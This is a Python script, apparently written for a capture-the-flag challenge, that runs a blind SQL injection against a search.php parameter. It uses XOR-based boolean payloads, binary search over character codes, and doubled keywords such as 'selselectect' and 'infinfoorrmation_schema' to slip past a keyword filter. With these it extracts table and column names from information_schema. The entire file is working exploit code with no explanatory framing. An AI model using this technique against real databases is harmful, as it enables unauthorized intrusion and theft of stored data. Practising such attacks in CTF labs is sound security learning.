#!/usr/bin/env python3
import requests
import time

URL = "http://68321904-15be-4b49-9f6a-508fbe5d863a.node5.buuoj.cn:81/search.php"
DELAY = 0.3

def test_condition(condition):
    """Test if condition is true using XOR blind injection"""
    payload = f"1^({condition})"
    try:
        r = requests.get(URL, params={"id": payload}, timeout=10)
        time.sleep(DELAY)
        return "ERROR" in r.text
    except Exception as e:
        print(f"[ERROR] {e}")
        time.sleep(5)
        return None

def extract_string(query, max_len=100):
    """Extract string using binary search"""
    result = ""

    # First find length
    length = None
    for l in range(1, max_len + 1):
        if test_condition(f"length({query})={l}"):
            length = l
            print(f"[+] Length: {length}")
            break

    if not length:
        print(f"[-] Could not determine length")
        return ""

    # Extract each character using binary search
    for pos in range(1, length + 1):
        low = 32
        high = 127

        while low < high:
            mid = (low + high) // 2
            if test_condition(f"ascii(substr({query},{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid

        char = chr(low)
        result += char
        print(f"[+] Extracted: {result}")

    return result

# Extract table names using double keyword bypass for information_schema
print("[*] Extracting table names...")
tables_query = "(selselectect(group_concat(table_name))frfrofromom(infinfoorrmation_schema.tables)whwhereere(table_schema=database()))"
tables = extract_string(tables_query, max_len=200)
print(f"[+] Tables: {tables}")

# Parse table names and extract columns
if tables:
    table_list = tables.split(",")
    for table in table_list:
        table = table.strip()
        print(f"\n[*] Extracting columns from {table}...")
        cols_query = f"(selselectect(group_concat(column_name))frfrofromom(infinfoorrmation_schema.columns)whwhereere(table_name='{table}'))"
        cols = extract_string(cols_query, max_len=200)
        print(f"[+] Columns in {table}: {cols}")
